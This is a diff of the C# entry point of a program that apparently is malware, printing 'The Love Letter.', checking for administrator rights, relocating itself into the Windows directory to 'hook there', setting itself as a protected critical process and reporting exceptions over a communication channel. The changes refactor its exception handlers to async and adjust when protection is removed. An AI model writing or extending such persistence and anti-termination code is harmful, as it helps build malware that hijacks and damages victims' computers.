@@ -19,9 +19,10 @@ namespace Client
         /// </summary>
         static void Main(string[] args)
         {
-            // make sure this thing wont crash
+            // this has nothing to do with threads
             Application.ThreadException += Application_ThreadException;
 
+            // exceptions on the entire application
             AppDomain.CurrentDomain.UnhandledException += CurrentDomain_UnhandledException;
 
             Console.WriteLine("The Love Letter.");
@@ -52,12 +53,9 @@ namespace Client
             {
                 Console.WriteLine("Admin!");
                 if (!Constants.IsInWinDir())
-                {
                     if (GoSomewhereSafe() != null)
-                    {
                         Environment.Exit(0);
-                    }
-                }
+
                 // now it will run there, wait for it to hook there
                 if (Constants.IsInWinDir())
                 {
@@ -139,18 +137,17 @@ namespace Client
             }
         }
 
-        private static void CurrentDomain_UnhandledException(object sender, UnhandledExceptionEventArgs e)
+        private async static void CurrentDomain_UnhandledException(object sender, UnhandledExceptionEventArgs e)
         {
-            Communication.String_Stacker.Send(e.ExceptionObject.ToString(), Communication.String_Stacker.StringType.ApplicationEvent);
             if (e.IsTerminating)
                 Armitage.Critical_Process.Unprotect();
+
+            await Communication.String_Stacker.Send(e.ExceptionObject.ToString(), Communication.String_Stacker.StringType.ApplicationEvent);
         }
 
-        private static void Application_ThreadException(object sender, ThreadExceptionEventArgs e)
-        {
-            Communication.String_Stacker.Send(e.Exception.ToString(), Communication.String_Stacker.StringType.ApplicationEvent);
-            // unkown reason must be unprotected i guess
-            Armitage.Critical_Process.Unprotect();
+        private async static void Application_ThreadException(object sender, ThreadExceptionEventArgs e)
+        {        
+            await  Communication.String_Stacker.Send(e.Exception.ToString(), Communication.String_Stacker.StringType.ApplicationEvent);
         }
 
         public static void ArgsParser(string[] args)
